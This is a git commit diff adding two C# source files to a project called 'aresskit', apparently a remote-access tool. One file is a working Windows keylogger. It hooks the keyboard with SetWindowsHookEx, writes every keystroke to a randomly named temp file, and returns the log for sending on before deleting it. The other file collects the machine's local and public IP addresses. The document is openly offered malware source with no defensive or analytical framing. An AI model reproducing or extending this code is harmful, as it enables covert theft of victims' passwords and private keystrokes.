37c509f06dafe06160275b2f10f952bfb62de30d
Willy Fox - BlackVikingPro <official.blackvikingpro@gmail.com>
2019-09-12 21:55:12 -0500

    moved files & updated gitignore

---
+++ app/aresskit/InterceptKeys.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace aresskit
+{
+    class InterceptKeys
+    {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static string logFile = Path.GetTempPath() + Misc.RandomString(16) + ".txt";
+
+        public static void StartKeylogger()
+        {
+            try
+            {
+                new Thread(() =>
+                {
+                    _hookID = SetHook(_proc);
+                    Application.Run();
+                    UnhookWindowsHookEx(_hookID);
+                }).Start();
+            }
+            catch (Exception)
+            {
+                Application.Exit(); // Close
+            }
+        }
+        
+        public static string GetKeylog()
+        {
+            string logFileContents = File.ReadAllText(logFile); // Store contents of log file into variable
+            File.Delete(logFile); // Delete log file so it doesn't get too big
+            return logFileContents; // Return log file contents back to stream
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(
+            int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                try
+                {
+                    using (StreamWriter w = File.AppendText(logFile))
+                        Misc.Log(((Keys)vkCode).ToString(), w);
+                }
+                catch (Exception) { Application.Exit(); } // Close
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    }
+}
---
+++ app/aresskit/Network.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+
+namespace aresskit
+{
+    public class Network
+    {
+        public static bool checkInternetConn(string server)
+        {
+            try
+            {
+                using (Ping pingSender = new Ping())
+                {
+                    PingReply reply = pingSender.Send(server);
+                    return reply.Status == IPStatus.Success ? true : false;
+                }
+            } catch (PingException)
+            { return false; }
+        }
+
+        public static string GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                    return ip.ToString();
+            }
+            throw new Exception("Local IP Address Not Found!");
+        }
+
+        public static string GetPublicIPAddress()
+        {
+            using (WebClient client = new WebClient())
+            {
+                client.Headers.Add("user-agent", "curl");
+                return client.DownloadString("http://ipinfo.io/");
+            }
+            // return new WebClient().DownloadString("ipinfo.io");
+        }
+    }
+}
